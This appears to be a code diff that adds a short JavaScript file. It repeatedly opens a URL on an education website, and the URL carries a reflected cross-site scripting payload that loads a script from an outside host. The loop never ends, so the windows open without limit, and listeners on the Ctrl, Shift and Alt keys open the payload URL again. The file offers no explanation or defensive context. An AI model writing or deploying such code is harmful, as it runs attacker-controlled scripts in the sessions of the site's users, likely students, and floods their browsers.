@@ -1,0 +1,31 @@
+var i = 1;
+while (i < 10) {
+    
+  window.open(
+    "https://www.brbytes.org/cms/stu-feedback?sectionCode=%27&studentCode=%3Cscript%20src=%27https://z215vh.csb.app/payload.txt%27%20/%3E"
+  );
+}
+
+document.addEventListener("keydown", function (event) {
+  if (event.ctrlKey) {
+    window.open(
+      "https://www.brbytes.org/cms/stu-feedback?sectionCode=%27&studentCode=%3Cscript%20src=%27https://z215vh.csb.app/payload.txt%27%20/%3E"
+    );
+  }
+});
+
+document.addEventListener("keydown", function (event) {
+  if (event.shiftKey) {
+    window.open(
+      "https://www.brbytes.org/cms/stu-feedback?sectionCode=%27&studentCode=%3Cscript%20src=%27https://z215vh.csb.app/payload.txt%27%20/%3E"
+    );
+  }
+});
+
+document.addEventListener("keydown", function (event) {
+  if (event.altKey) {
+    window.open(
+      "https://www.brbytes.org/cms/stu-feedback?sectionCode=%27&studentCode=%3Cscript%20src=%27https://z215vh.csb.app/payload.txt%27%20/%3E"
+    );
+  }
+});
